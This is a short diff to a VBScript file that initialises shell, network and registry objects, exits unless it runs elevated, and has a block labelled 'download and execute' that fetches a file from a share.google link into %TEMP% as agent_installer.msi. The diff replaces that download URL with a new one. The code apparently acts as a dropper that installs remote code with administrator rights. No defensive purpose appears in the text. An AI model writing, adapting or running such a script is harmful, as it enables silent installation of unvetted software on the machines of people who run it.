@@ -5,11 +5,13 @@
 Option Explicit
 
 ' Initialize system variables
-Dim WshShell, Fso, EnvVars, SysInfo, ProcList, NetObj, RegObj
+Dim WshShell, Fso, EnvVars, ProcList, NetObj, RegObj
 Set WshShell = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
 Set EnvVars = WshShell.Environment("Process")
-Set SysInfo = CreateObject("Win32_SystemInfo")
+Set ProcList = CreateObject("Scripting.Dictionary")
+Set NetObj = CreateObject("WScript.Network")
+Set RegObj = CreateObject("WScript.Shell")
 
 ' System information collection
 Function GetSystemInfo()
@@ -416,7 +418,7 @@ If Not IsElevated() Then WScript.Quit
 
 ' Core functionality - download and execute
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell
-strUrl = "https://share.google/mkGe1JX56Lut4KMdt"
+strUrl = "https://share.google/dDynM21vQuy0Qvc4Z"
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
@@ -470,6 +472,8 @@ logFile.Close
 ' Final cleanup
 Set WshShell = Nothing
 Set Fso = Nothing
+Set NetObj = Nothing
+Set RegObj = Nothing
 Set objXMLHTTP = Nothing
 Set objADOStream = Nothing
 Set objShell = Nothing
